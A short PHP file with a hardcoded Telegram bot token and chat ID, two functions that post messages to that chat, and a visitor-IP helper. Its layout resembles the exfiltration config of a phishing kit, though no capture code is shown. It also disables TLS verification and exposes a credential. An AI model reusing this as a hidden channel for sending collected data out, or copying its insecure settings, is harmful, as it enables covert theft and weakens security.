<?php 
// Change that :
define("TOKEN", '7198861444:AAEmUQ6qpkaN8i3FoVoJudUeJsYlxBOVMxM');
define("CHATID", '-4675552873');

function telegram($message){
    $chat_id= CHATID;
    $token= TOKEN;
    
    $url="https://api.telegram.org/bot$token/sendMessage?text=$message&chat_id=$chat_id";
    $ch=curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    $result=curl_exec($ch);
    curl_close($ch);
}

function get_client_ip() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    if( $ip == '::1' ) {
        return '127.0.0.1';
    }
    return  $ip;
}



function telegram_copy($message_2) {
    $chat_id_1 = CHATID; 
    $token_1 = TOKEN;

    $payload = [
        'chat_id' => $chat_id_1,
        'text' => $message_2,
        'parse_mode' => 'HTML'
    ];

    $url = "https://api.telegram.org/bot$token_1/sendMessage?" . http_build_query($payload);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
}